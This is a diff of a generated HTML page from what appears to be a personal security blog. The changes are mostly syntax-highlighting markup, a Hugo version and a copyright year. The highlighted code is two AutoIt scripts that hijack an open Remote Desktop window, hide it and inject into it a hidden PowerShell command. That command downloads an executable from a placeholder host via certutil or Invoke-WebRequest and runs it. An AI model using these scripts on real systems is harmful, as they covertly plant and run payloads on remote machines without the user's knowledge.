@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.105.0"><meta name="theme-color" content="#16171d" />
+    <meta name="generator" content="Hugo 0.109.0"><meta name="theme-color" content="#16171d" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -350,25 +350,25 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#include &lt;AutoItConstants.au3&gt;</span>
 </span></span><span class="line"><span class="cl"><span class="n">Local</span> <span class="nv">$aList</span> <span class="p">=</span> <span class="n">WinList</span><span class="p">(</span><span class="s2">&#34;192.168.1.1:3389 - 远程桌面连接&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="k">For</span> <span class="nv">$i</span> <span class="p">=</span> <span class="n">1</span> <span class="n">To</span> <span class="nv">$aList</span><span class="p">[</span><span class="n">0</span><span class="p">][</span><span class="n">0</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl">   <span class="n">Example</span><span class="p">(</span><span class="nv">$aList</span><span class="p">[</span><span class="nv">$i</span><span class="p">][</span><span class="n">1</span><span class="p">]))</span>
-</span></span><span class="line"><span class="cl">   <span class="n">sleep</span><span class="p">(</span><span class="n">8000</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">For</span> <span class="nv">$i</span> <span class="p">=</span> <span class="mf">1</span> <span class="n">To</span> <span class="nv">$aList</span><span class="p">[</span><span class="mf">0</span><span class="p">][</span><span class="mf">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="n">Example</span><span class="p">(</span><span class="nv">$aList</span><span class="p">[</span><span class="nv">$i</span><span class="p">][</span><span class="mf">1</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">   <span class="n">sleep</span><span class="p">(</span><span class="mf">8000</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">Next</span>
 </span></span><span class="line"><span class="cl"><span class="n">Func</span> <span class="n">Example</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">  <span class="n">Local</span> <span class="nv">$iState</span> <span class="p">=</span> <span class="n">WinGetState</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">);</span><span class="n">判断是否是最小化</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Local</span> <span class="nv">$iState</span> <span class="p">=</span> <span class="n">WinGetState</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">);</span><span class="err">判断是否是最小化</span>
 </span></span><span class="line"><span class="cl">  <span class="n">WinSetState</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">@SW_HIDE</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">  <span class="n">SendKeepActive</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">  <span class="n">Send</span><span class="p">(</span><span class="s2">&#34;#r&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">  <span class="n">sleep</span><span class="p">(</span><span class="n">800</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">sleep</span><span class="p">(</span><span class="mf">800</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">  <span class="n">Send</span><span class="p">(</span><span class="s2">&#34;{DEL 2}&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">  <span class="n">Send</span><span class="p">(</span><span class="s2">&#34;{SHIFTDOWN}&#34;</span><span class="p">);</span><span class="n">全部大写</span><span class="err">，</span><span class="n">是为了解决输入法的问题</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Send</span><span class="p">(</span><span class="s2">&#34;{SHIFTDOWN}&#34;</span><span class="p">);</span><span class="err">全部大写，是为了解决输入法的问题</span>
 </span></span><span class="line"><span class="cl">  <span class="n">Send</span><span class="p">(</span><span class="s2">&#34;{SHIFTUP}&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">  <span class="n">sleep</span><span class="p">(</span><span class="n">800</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">  <span class="n">Opt</span><span class="p">(</span><span class="s2">&#34;SendKeyDelay&#34;</span><span class="p">,</span> <span class="n">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">sleep</span><span class="p">(</span><span class="mf">800</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Opt</span><span class="p">(</span><span class="s2">&#34;SendKeyDelay&#34;</span><span class="p">,</span> <span class="mf">0</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">  <span class="n">Send</span><span class="p">(</span><span class="s1">&#39;POWERSHELL{SPACE}{SPACE}-WINDOWSTYLE{SPACE}{SPACE}HIDDEN{SPACE}{SPACE}-C{SPACE}{SPACE}&#34;CERTUTIL{SPACE}{SPACE}-URLCACHE{SPACE}{SPACE}-SPLIT{SPACE}{SPACE}-F{SPACE}{SPACE}HTTPS://XXX.com/XXX.PNG{SPACE}{SPACE}C:/WINDOWS/TASKS/XXX.EXE;C:/WINDOWS/TASKS/XXX.EXE&#34;&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">  <span class="n">Sleep</span><span class="p">(</span><span class="n">500</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Sleep</span><span class="p">(</span><span class="mf">500</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">  <span class="n">Send</span><span class="p">(</span><span class="s2">&#34;{enter}{enter}&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">  <span class="n">sleep</span><span class="p">(</span><span class="n">500</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">sleep</span><span class="p">(</span><span class="mf">500</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">  <span class="n">WinSetState</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">@SW_SHOW</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">  <span class="k">If</span> <span class="n">BitAND</span><span class="p">(</span><span class="nv">$iState</span><span class="p">,</span> <span class="nv">$WIN_STATE_MINIMIZED</span><span class="p">)</span> <span class="n">Then</span>
 </span></span><span class="line"><span class="cl">     <span class="n">WinSetState</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">@SW_MINIMIZE</span><span class="p">)</span>
@@ -406,10 +406,10 @@
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#include &lt;AutoItConstants.au3&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="n">ClipPut</span><span class="p">(</span><span class="s2">&#34;POWERSHELL -W HIDDEN -C IWR HTTPS://xxx.COM/xx.CAB -OUTF $ENV:TMP/xx.CAB;EXPAND $ENV:TMP/xx.CAB -F:* $ENV:TMP;&amp;$ENV:TMP/xx.exe&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">Local</span> <span class="nv">$hWnd</span><span class="p">=</span><span class="n">HWnd</span><span class="p">(</span><span class="nv">$CmdLine</span><span class="p">[</span><span class="n">1</span><span class="p">])</span> <span class="p">;</span><span class="n">handle</span>
+</span></span><span class="line"><span class="cl"><span class="n">ClipPut</span><span class="p">(</span><span class="s2">&#34;POWERSHELL -W HIDDEN -C IWR HTTPS://xxx.COM/xx.CAB -OUTF </span><span class="nv">$ENV:TMP</span><span class="s2">/xx.CAB;EXPAND </span><span class="nv">$ENV:TMP</span><span class="s2">/xx.CAB -F:* </span><span class="nv">$ENV:TMP</span><span class="s2">;&amp;</span><span class="nv">$ENV:TMP</span><span class="s2">/xx.exe&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">Local</span> <span class="nv">$hWnd</span><span class="p">=</span><span class="n">HWnd</span><span class="p">(</span><span class="nv">$CmdLine</span><span class="p">[</span><span class="mf">1</span><span class="p">])</span> <span class="p">;</span><span class="n">handle</span>
 </span></span><span class="line"><span class="cl"><span class="n">ControlFocus</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">Local</span> <span class="nv">$iState</span> <span class="p">=</span> <span class="n">WinGetState</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">);</span><span class="n">判断是否是最小化</span>
+</span></span><span class="line"><span class="cl"><span class="n">Local</span> <span class="nv">$iState</span> <span class="p">=</span> <span class="n">WinGetState</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">);</span><span class="err">判断是否是最小化</span>
 </span></span><span class="line"><span class="cl"><span class="k">If</span> <span class="n">BitAND</span><span class="p">(</span><span class="nv">$iState</span><span class="p">,</span> <span class="nv">$WIN_STATE_MINIMIZED</span><span class="p">)</span> <span class="n">Then</span>
 </span></span><span class="line"><span class="cl">   <span class="n">WinSetState</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">@SW_RESTORE</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="k">Else</span>
@@ -417,9 +417,9 @@
 </span></span><span class="line"><span class="cl"><span class="n">EndIf</span>
 </span></span><span class="line"><span class="cl"><span class="n">ControlSend</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;#r&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">ControlSend</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;+{INS}&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">;</span><span class="n">Sleep</span><span class="p">(</span><span class="n">3000</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">;</span><span class="n">Sleep</span><span class="p">(</span><span class="mf">3000</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">ControlSend</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;{enter}&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">Sleep</span><span class="p">(</span><span class="n">300</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">Sleep</span><span class="p">(</span><span class="mf">300</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="k">If</span> <span class="n">BitAND</span><span class="p">(</span><span class="nv">$iState</span><span class="p">,</span> <span class="nv">$WIN_STATE_MINIMIZED</span><span class="p">)</span> <span class="n">Then</span>
 </span></span><span class="line"><span class="cl">   <span class="n">WinSetState</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">@SW_MINIMIZE</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="k">Else</span>
@@ -591,7 +591,7 @@
     
 
 
-            <div class="site-info">©&nbsp;2022&nbsp;myzxcg&nbsp;| Powered by <a href="https://github.com/reuixiy/hugo-theme-meme" target="_blank" rel="noopener">MemE</a>
+            <div class="site-info">©&nbsp;2023&nbsp;myzxcg&nbsp;| Powered by <a href="https://github.com/reuixiy/hugo-theme-meme" target="_blank" rel="noopener">MemE</a>
               </div>
 
             
